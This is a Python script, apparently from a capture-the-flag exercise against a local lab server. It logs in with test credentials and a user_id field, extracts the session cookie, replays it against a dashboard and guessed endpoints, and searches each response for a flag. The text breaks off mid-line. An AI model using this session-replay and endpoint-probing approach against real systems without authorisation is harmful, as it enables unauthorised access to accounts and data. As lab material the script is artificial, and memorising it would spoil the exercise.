import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Manual cookie extraction and usage\n")

# Perform authentication
auth_data = {
    'username': 'test',
    'password': 'test',
    'user_id': '10032'
}

auth_resp = requests.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)
print(f"[+] Auth response: {auth_resp.status_code}")
print(f"[+] Set-Cookie header: {auth_resp.headers.get('Set-Cookie', 'None')}")

# Extract session cookie value
set_cookie_header = auth_resp.headers.get('Set-Cookie', '')
if 'session=' in set_cookie_header:
    # Parse: session=VALUE; HttpOnly; Path=/
    session_value = set_cookie_header.split('session=')[1].split(';')[0]
    print(f"[+] Extracted session value: {session_value}\n")
    
    # Try to access dashboard with this cookie
    print(f"[TEST 1] GET /dashboard with session cookie")
    cookies = {'session': session_value}
    dash_resp = requests.get(DASHBOARD_URL, cookies=cookies, allow_redirects=False)
    print(f"Status: {dash_resp.status_code}")
    print(f"Location: {dash_resp.headers.get('Location', 'N/A')}")
    print(f"Body length: {len(dash_resp.text)}B")
    print(f"Body:\n{dash_resp.text}\n")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
    if flag_match:
        print(f"[!] FLAG FOUND: {flag_match.group(0)}\n")
    
    print("="*60 + "\n")
    
    # Try other endpoints with the session cookie
    test_endpoints = [
        "/",
        "/profile",
        "/user",
        "/api/user",
        "/account",
        "/settings",
    ]
    
    print("[TEST 2] Try various endpoints with session cookie\n")
    for endpoint in test_endpoints:
        try:
            resp = requests.get(BASE_URL + endpoint, cookies=cookies, timeout=3)
            if resp.status_code != 404:
                print(f"{endpoint}: Status {resp.status_code}, Length {len(resp.text)}B")
                
                # Check for FLAG or interesting content
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"  [!] FLAG: {flag_match.group(0)}")
                    print(f"  Full response:\n{resp.text}\n")
                elif len(resp.text) != 1184 and resp.status_code == 200:
